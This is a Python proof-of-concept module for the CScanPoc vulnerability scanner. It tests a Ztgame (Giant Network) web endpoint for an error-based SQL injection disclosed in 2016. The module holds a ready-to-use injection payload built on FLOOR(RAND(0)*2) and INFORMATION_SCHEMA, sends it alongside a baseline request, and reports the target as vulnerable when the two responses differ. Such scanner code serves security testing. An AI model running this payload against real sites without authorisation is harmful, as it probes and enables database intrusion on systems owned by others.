# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Ztgame_0101'  # 平台漏洞编号
    name = '巨人网络报错SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-17'  # 漏洞公布时间
    desc = '''
    巨人网络报错SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=204249
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ztgame'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '42544626-ba1e-4664-b9d5-3ced2dca7ae0'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/live/public/newsinfo/36 AND (SELECT 1271 FROM(SELECT COUNT(*),CONCAT(0x71766b7171,(SELECT (ELT(1271=1271,1))),0x7170766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 996=996"
            payload1 = "/live/public/newsinfo/36"
            url = self.target + payload
            url1 = self.target + payload1
            _response = requests.get(url)
            _response1 = requests.get(url1)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
